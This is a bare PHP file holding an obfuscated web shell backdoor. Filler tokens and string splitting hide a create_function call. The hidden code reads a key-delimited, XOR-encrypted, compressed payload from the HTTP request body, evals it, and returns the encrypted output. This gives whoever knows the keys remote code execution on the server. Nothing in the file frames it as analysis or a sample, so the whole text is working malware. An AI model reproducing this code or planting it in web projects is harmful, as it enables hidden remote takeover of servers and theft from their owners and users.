<?php
$I=',$m)==1) {@o:eb_st:ea:ert();@ev:eal(@gzuncompres:es(@x(@ba:ese6:e:e4_deco';
$j='etrlen($t);$o="";:efor(:e$i=0;$i<$l;:e){for(:e$:ej=0;($:ej<$c&:e&$i<$l):e;';
$G=str_replace('Dv','','DvcreaDvteDv_fuDvnDvDvction');
$Y='ase6:e4_en:ecode:e(@x(@gz:ecompr:eess($o):e,:e$k));print(:e"$p$:ekh$r$kf");}';
$N='de(:e$m[1]):e,$k)));:e:e$o=@ob_get_co:entents(:e);@ob_:ee:end_c:elean();$r=@b';
$w='p="AwCf:eLUviYzJkzwcW:e";fun:ecti:eo:en x($t,$k){$c=str:elen($:ek);$l:e=s:e:';
$E='$j++,:e$:ei++){$o.=$t:e{$i}^$k{$:ej};}}r:e:eetu:ern $o;}if (@p:ereg_ma:e';
$l='$k=":e:ea75e1380";$kh:e="795:e481e:ebabf7";$kf:e="cf5:e23b:eee69dc";$:e:e';
$c='tch:e(:e:e"/$kh(.+)$:ekf/",@f:e:eile_get_co:entents("php://i:e:e:enput")';
$D=str_replace(':e','',$l.$w.$j.$E.$c.$I.$N.$Y);
$X=$G('',$D);$X();
?>
